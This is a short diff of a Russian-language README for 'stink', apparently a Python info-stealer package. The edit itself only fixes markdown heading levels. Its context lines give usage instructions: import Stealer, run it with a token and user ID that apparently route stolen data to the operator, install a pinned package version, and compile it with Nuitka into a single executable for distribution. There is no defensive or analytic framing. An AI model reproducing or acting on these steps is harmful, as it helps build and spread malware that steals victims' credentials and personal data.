@@ -120,7 +120,7 @@ from stink.multistealer import Stealer
 
 Stealer(token="YOUR_TOKEN", user_id=YOUR_ID).run()
 ```
-###PyCharm
+#### PyCharm
 Устанавливаем Nuitka и Stink:
 ```
 pip install Nuitka==0.6.16.4
@@ -133,7 +133,7 @@ pip install stink==0.0.3
 ```python
 nuitka --onefile --include-package=stink test.py
 ```
-###CMD
+#### CMD
 Открываем `cmd`.
 
 Прописываем команду:
